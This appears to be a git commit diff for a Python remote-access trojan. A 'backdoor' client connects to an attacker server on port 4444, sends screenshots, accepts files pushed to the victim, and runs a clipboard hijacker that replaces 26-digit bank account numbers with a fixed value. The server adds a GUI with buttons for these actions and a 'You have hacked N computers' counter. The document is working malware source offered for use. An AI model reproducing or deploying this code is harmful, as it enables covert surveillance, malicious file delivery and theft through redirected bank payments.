c5637affc697bb6240fc82edd5e2ae918e65adaa
BSalwiczek <bartoszsalwiczek@gmail.com>
2021-04-13 13:36:45 +0200

    Sending files to victim & changing clipboard

--- client.py
+++ client.py
@@ -1,7 +1,11 @@
 import socket
 import pyautogui
 from io import BytesIO
-
+import clipboard
+import threading
+import time
+import re
+from datetime import datetime
 
 def connect_with_attacker():
     # server_ip = '192.168.0.136'
@@ -9,25 +13,42 @@ def connect_with_attacker():
     port = 4444
 
     backdoor = socket.socket()
-    backdoor.connect((server_ip, port))
+    clipboard_changing_active = False
 
-    while True:
-        try:
-            message = backdoor.recv(1024).decode("UTF-8")
+    try:
+        backdoor.connect((server_ip, port))
 
-            if message == 'screenshot':
-                send_screenshot(backdoor)
-            else:
-                pass
-        except:
-            print("error")
-            backdoor.close()
-            break
-        pass
+        while True:
+            try:
+                message = backdoor.recv(1024).decode("UTF-8")
 
-    # wait for orders
-    # while True:
-    #
+                if message == 'screenshot':
+                    send_screenshot(backdoor)
+                elif message == 'clipboard':
+                    if not clipboard_changing_active:
+                        clipboard_changing_active = True
+                        changing_clipboard_thread = threading.Thread(target=changing_clipboard)
+                        changing_clipboard_thread.start()
+                elif message == 'file':
+                    extension = backdoor.recv(1024).decode("UTF-8")
+                    print("Waiting for file with extension: " + extension)
+                    now = datetime.now()
+                    f = open('sent_to_victim/'+now.strftime("%Y%m%d_%H-%M-%S") + extension, 'wb')
+                    msg = backdoor.recv(1024)
+
+                    while len(msg) == 1024:
+                        f.write(msg)
+                        msg = backdoor.recv(1024)
+
+                    f.close()
+                    print("receiving ended")
+            except:
+                print("error")
+                backdoor.close()
+                break
+            pass
+    except:
+        print("Connection failed.")
 
 
 def send_screenshot(backdoor):
@@ -43,6 +64,16 @@ def send_screenshot(backdoor):
         package = buffered.read(1024)
     backdoor.send(str.encode('Finished'))
     print("sending finished")
+
+
+def changing_clipboard():
+    recent_value = ""
+    while True:
+        tmp_value = clipboard.paste()
+        if tmp_value != recent_value:
+            recent_value = tmp_value
+            clipboard.copy(re.sub(r"(?<!\d)\d{26}(?!\d)", "6" * 26, tmp_value))
+        time.sleep(0.1)
 
 
 # attacker_thread = threading.Thread(target=connect_with_attacker)
--- server.py
+++ server.py
@@ -5,25 +5,38 @@ import threading
 import subprocess
 from queue import Queue
 from datetime import datetime
+import os
 
 messages_queue = Queue()
+
 
 class GUI:
     window = None
 
     def __init__(self):
-        layout = [[sg.Text(size=(40,10), key='-TITLE-')],  # Part 2 - The Layout
-                  [sg.Button('Take a screenshot')]]
+        layout = [[sg.Text(size=(40, 10), key='-TITLE-')],  # Part 2 - The Layout
+                  [sg.Button('Take a screenshot')],
+                  [sg.Button('Change clipboard')],
+                  [sg.In(), sg.FileBrowse(key="-IN-")],
+                  [sg.Button('Send file')],
+                  [sg.Button('Quit')]]
 
         GUI.window = sg.Window('Attacer server', layout, finalize=True)
         GUI.window['-TITLE-'].update("You have hacked 0 computers")
+
         while True:
             event, values = GUI.window.read()
 
             if event == sg.WINDOW_CLOSED or event == 'Quit':
+                messages_queue.put('STOP')
                 break
             if event == 'Take a screenshot':
                 self.take_screenshot()
+            if event == 'Change clipboard':
+                self.change_clipboard()
+            if event == 'Send file':
+                filename = values["-IN-"]
+                self.send_file(filename)
 
         GUI.window.close()
 
@@ -33,17 +46,24 @@ class GUI:
 
     def take_screenshot(self):
         messages_queue.put('screenshot')
+
+    def change_clipboard(self):
+        messages_queue.put('clipboard')
         # self.server.takeScreenshot('screenshot')
+
+    def send_file(self, filename):
+        messages_queue.put(f"send file:{filename}")
 
 
 class Server:
+    SERVER_IP = socket.gethostbyname(socket.gethostname())  # == 127.0.1.1
+    # SERVER_IP = '192.168.0.136'
+    PORT = 4444
+    CONNECTION_QUEUE_LIMIT = 5
 
     def __init__(self):
-        server_ip = socket.gethostbyname(socket.gethostname())
-        # server_ip = '192.168.0.136'
-        port = 4444
 
-        address = (server_ip, port)
+        address = (self.SERVER_IP, self.PORT)
 
         self.clients = []  # list of all clients
         self.connected_clients = 0
@@ -51,8 +71,8 @@ class Server:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind(address)
 
-        print("Server is working on " + server_ip)
-        server.listen()
+        print("Server is working on " + self.SERVER_IP)
+        server.listen(self.CONNECTION_QUEUE_LIMIT)
 
         # thread for dealing with messages
         messages_thread = threading.Thread(target=self.messaes_handler)
@@ -61,7 +81,7 @@ class Server:
         while True:
             # accept connection with client
             conn, addr = server.accept()
-            conn.send("NAME".encode("utf-8"))
+            # conn.send("NAME".encode("utf-8"))
             self.clients.append(conn)
             self.connected_clients += 1
 
@@ -95,7 +115,7 @@ class Server:
         GUI.update_hacked_num(self.connected_clients)
         conn.close()
 
-    def is_socket_closed(self,sock):
+    def is_socket_closed(self, sock):
         try:
             # this will try to read bytes without blocking and also without removing them from buffer (peek only)
             data = sock.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
@@ -111,11 +131,28 @@ class Server:
 
     def messaes_handler(self):
         for msg in iter(messages_queue.get, 'STOP'):
-            self.send_message(msg)
+            if len(msg.split(":")) == 2:
+                file_path = msg.split(":")[1]
+                f = open(file_path, "rb")
+                _, file_extension = os.path.splitext(file_path)
+                self.send_message("file")
+                self.send_message(file_extension)
+                try:
+                    file_bytes = f.read(1024)
+                    while file_bytes != "":
+                        self.send_message(file_bytes, binary=True)
+                        file_bytes = f.read(1024)
+                finally:
+                    f.close()
+            else:
+                self.send_message(msg)
 
-    def send_message(self, message):
+    def send_message(self, message, binary=False):
         for client in self.clients:
-            client.send(str.encode(message))
+            if binary:
+                client.send(message)
+            else:
+                client.send(str.encode(message))
 
 
 # New thread for server
